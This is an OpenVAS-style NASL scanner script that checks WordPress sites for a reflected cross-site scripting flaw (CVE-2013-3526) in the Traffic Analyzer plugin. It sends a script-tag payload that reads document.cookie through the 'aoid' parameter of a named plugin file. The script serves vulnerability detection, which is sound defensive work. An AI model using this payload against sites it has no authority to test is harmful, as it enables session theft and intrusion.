CPE = "cpe:/a:wordpress:wordpress";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.803372" );
	script_version( "2019-11-12T13:33:43+0000" );
	script_cve_id( "CVE-2013-3526" );
	script_bugtraq_id( 58948 );
	script_tag( name: "cvss_base", value: "4.3" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:N/I:P/A:N" );
	script_tag( name: "last_modification", value: "2019-11-12 13:33:43 +0000 (Tue, 12 Nov 2019)" );
	script_tag( name: "creation_date", value: "2013-04-12 17:30:46 +0530 (Fri, 12 Apr 2013)" );
	script_name( "WordPress Traffic Analyzer Plugin XSS Vulnerability" );
	script_xref( name: "URL", value: "http://secunia.com/advisories/52929" );
	script_xref( name: "URL", value: "http://packetstormsecurity.com/files/121167" );
	script_xref( name: "URL", value: "http://exploitsdownload.com/exploit/na/wordpress-traffic-analyzer-cross-site-scripting" );
	script_category( ACT_ATTACK );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_copyright( "This script is Copyright (C) 2013 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "secpod_wordpress_detect_900182.sc" );
	script_mandatory_keys( "wordpress/installed" );
	script_require_ports( "Services/www", 80 );
	script_tag( name: "impact", value: "Successful exploitation will allow remote attackers to insert
arbitrary HTML and script code, which will be executed in a user's browser
session in the context of an affected site." );
	script_tag( name: "affected", value: "WordPress Traffic Analyzer Plugin version 3.3.2 and prior" );
	script_tag( name: "insight", value: "The input passed via 'aoid' parameters to
'/wp-content/plugins/trafficanalyzer/js/ta_loaded.js.php' script is not
properly validated." );
	script_tag( name: "solution", value: "Update to WordPress Traffic Analyzer Plugin version 3.4.0 or
later." );
	script_tag( name: "summary", value: "This host is running WordPress with Traffic Analyzer plugin and
is prone to cross site scripting vulnerability." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_xref( name: "URL", value: "http://wordpress.org/extend/plugins/trafficanalyzer" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("host_details.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
url = dir + "/wp-content/plugins/trafficanalyzer/js/ta_loaded.js.php?aoid=" + "\"><script>alert(document.cookie)</script>";
if(http_vuln_check( port: port, url: url, check_header: TRUE, pattern: "><script>alert\\(document\\.cookie\\)</script>" )){
	security_message( port: port );
	exit( 0 );
}

